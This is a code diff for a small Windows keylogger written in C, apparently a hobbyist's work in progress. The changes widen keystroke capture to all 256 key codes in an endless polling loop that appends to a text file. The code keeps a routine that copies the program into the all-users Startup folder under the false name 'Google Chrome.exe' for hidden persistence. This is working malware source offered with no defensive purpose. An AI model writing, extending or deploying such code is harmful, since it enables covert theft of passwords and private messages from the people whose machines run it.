@@ -1,7 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
-#include <sys/stat.h>
+#include <locale.h>
 
 void getWords();
 int fileExists(char *file);
@@ -9,9 +9,14 @@ void hideProgram();
 
 int main(int argc, char* argv[])
 {	
-	ShowWindow(GetForegroundWindow(), SW_HIDE);
-	hideProgram();
-	system("pause");
+	// ShowWindow(GetForegroundWindow(), SW_HIDE);
+	// hideProgram(argv[0]);
+	
+	while(1)
+	{
+		Sleep(1);
+		getWords();
+	}
 	return 0;
 }
 
@@ -20,29 +25,26 @@ void getWords()
 {	
 	int resultado, tecla;
 	FILE *file;
+	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a+");
 	
-	file = fopen("teclas.txt", "w");
-
-	Sleep(1);
-	for(tecla = 65; tecla <= 90; tecla++)
+	for(tecla = 0; tecla <= 255; tecla++)
 	{
 		resultado = GetAsyncKeyState(tecla);
 
 		if(resultado == -32767) {
 			fprintf(file,"%c",tecla);
-			
-			printf("%c", tecla);
 		}
 	}
 }
 
-void hideProgram(){
+void hideProgram(char* file)
+{
 	char* AllUsersProfile = getenv("allusersprofile");
 	char destino[9999];
 	strcpy(destino, AllUsersProfile);
 	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
 	if(!fileExists(destino)){
-		CopyFile(argv[0],destino,0);
+		CopyFile(file,destino,0);
 	}
 }
 
